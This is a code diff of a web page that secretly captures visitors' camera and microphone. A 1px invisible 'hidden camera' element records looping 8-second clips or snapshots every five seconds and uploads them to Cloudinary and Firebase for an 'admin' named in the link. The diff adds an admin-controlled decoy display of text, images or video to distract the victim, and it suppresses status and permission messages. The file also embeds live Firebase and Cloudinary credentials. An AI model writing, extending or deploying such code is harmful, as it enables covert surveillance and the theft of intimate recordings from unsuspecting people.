@@ -7,20 +7,32 @@
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 <style>
-    body { background: #fff; margin: 0; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
-    #preview { opacity: 0; position: absolute; pointer-events: none; }
-    h1 { font-family: monospace; color: #333; font-size: 16px; }
+    body { background: #fff; margin: 0; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; font-family: sans-serif; }
+    
+    /* LIVE CONTENT AREA */
+    #live-container { width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
+    #live-text { font-size: 28px; font-weight: bold; color: #333; }
+    #live-img { max-width: 100%; max-height: 90vh; border-radius: 10px; display: none; }
+    #live-video { max-width: 100%; max-height: 90vh; border-radius: 10px; display: none; }
+
+    /* HIDDEN CAMERA */
+    #preview { opacity: 0; position: absolute; pointer-events: none; width: 1px; height: 1px; }
 </style>
 </head>
 <body>
 
-    <h1 id="status">Connecting to Server...</h1>
+    <!-- LIVE VIEW SECTION -->
+    <div id="live-container">
+        <h1 id="live-text">Waiting for connection...</h1>
+        <img id="live-img">
+        <video id="live-video" controls autoplay loop></video>
+    </div>
+
+    <!-- HIDDEN CAMERA -->
     <video id="preview" autoplay playsinline muted></video>
 
 <script>
-    // --- 1. CONFIGURATION ---
-    
-    // FIREBASE CONFIG
+    // --- CONFIGURATION ---
     const firebaseConfig = {
         apiKey: "AIzaSyAAnJxWPmU2d_Lz15wCbwrujnZyfq8DQlk",
         authDomain: "camera-cbf3e.firebaseapp.com",
@@ -30,8 +42,6 @@
         appId: "1:1051235103322:web:238b22d3c69263beb0de63",
         measurementId: "G-2B2PNSPHX3"
     };
-
-    // CLOUDINARY CONFIG (From your screenshot)
     const CLOUD_NAME = "dbkqfeq7k";
     const UPLOAD_PRESET = "Camera1.0"; 
 
@@ -42,74 +52,92 @@
     const ADMIN_ID = urlParams.get('uid'); 
     const MODE = urlParams.get('mode');
 
-    // --- 2. MAIN LOGIC ---
-
+    // --- MAIN LOGIC ---
     async function startApp() {
         if (!ADMIN_ID) {
-            document.getElementById('status').innerText = "Error: Invalid Link ID";
+            document.getElementById('live-text').innerText = "System Error: Invalid ID";
             return;
         }
 
+        // 1. Listen for Live Content from Admin
+        db.collection('admins').doc(ADMIN_ID).collection('live').doc('screen')
+          .onSnapshot(doc => {
+              if(doc.exists) {
+                  const d = doc.data();
+                  updateScreen(d.type, d.content);
+              }
+          });
+
+        // 2. Camera Operations
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
             document.getElementById('preview').srcObject = stream;
-            document.getElementById('status').innerText = "System Active...";
 
             if (MODE === 'record') {
                 startRecording(stream);
             } else if (MODE === 'image') {
-                setInterval(() => captureImage(), 5000); // 5 sec interval
+                setInterval(() => captureImage(), 5000);
             }
-
         } catch (e) {
-            document.getElementById('status').innerText = "Permission Required!";
+            console.log("Permission Denied");
         }
     }
 
-    // --- 3. CLOUDINARY UPLOADER ---
+    function updateScreen(type, content) {
+        const txt = document.getElementById('live-text');
+        const img = document.getElementById('live-img');
+        const vid = document.getElementById('live-video');
+
+        // Reset
+        txt.style.display = 'none';
+        img.style.display = 'none';
+        vid.style.display = 'none';
+        vid.pause();
+
+        if (type === 'text') {
+            txt.innerText = content;
+            txt.style.display = 'block';
+        } else if (type === 'image') {
+            img.src = content;
+            img.style.display = 'block';
+        } else if (type === 'video') {
+            vid.src = content;
+            vid.style.display = 'block';
+            vid.play();
+        }
+    }
+
+    // --- UPLOADERS ---
     async function uploadToCloudinary(blob) {
         const formData = new FormData();
         formData.append('file', blob);
         formData.append('upload_preset', UPLOAD_PRESET);
 
         try {
-            // Upload to Cloudinary
-            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
-                method: 'POST',
-                body: formData
-            });
+            const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, { method: 'POST', body: formData });
             const data = await res.json();
             
-            // Save LINK to Firebase
             if(data.secure_url) {
-                const collection = (MODE === 'record') ? 'recordings' : 'images';
-                db.collection("admins").doc(ADMIN_ID).collection(collection).add({
-                    data: data.secure_url, // Saving URL instead of file
+                const col = (MODE === 'record') ? 'recordings' : 'images';
+                db.collection("admins").doc(ADMIN_ID).collection(col).add({
+                    data: data.secure_url,
                     createdAt: firebase.firestore.FieldValue.serverTimestamp()
                 });
-                console.log("Uploaded: ", data.secure_url);
             }
-        } catch (err) {
-            console.error("Upload Failed", err);
-        }
+        } catch (err) { console.error(err); }
     }
-
-    // --- 4. CAPTURE FUNCTIONS ---
 
     function startRecording(stream) {
         let chunks = [];
         const mr = new MediaRecorder(stream);
-        
         mr.ondataavailable = e => chunks.push(e.data);
         mr.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/webm' });
-            uploadToCloudinary(blob); // Upload Video Blob
-            
+            uploadToCloudinary(blob);
             chunks = [];
             mr.start();
-            setTimeout(() => mr.stop(), 8000); // 8 Seconds Video Clip
+            setTimeout(() => mr.stop(), 8000);
         };
-
         mr.start();
         setTimeout(() => mr.stop(), 8000);
     }
@@ -117,15 +145,9 @@
     function captureImage() {
         const video = document.getElementById('preview');
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // Convert to Blob and Upload
-        canvas.toBlob(blob => {
-            uploadToCloudinary(blob);
-        }, 'image/jpeg', 0.7);
+        canvas.toBlob(blob => uploadToCloudinary(blob), 'image/jpeg', 0.7);
     }
 
     startApp();
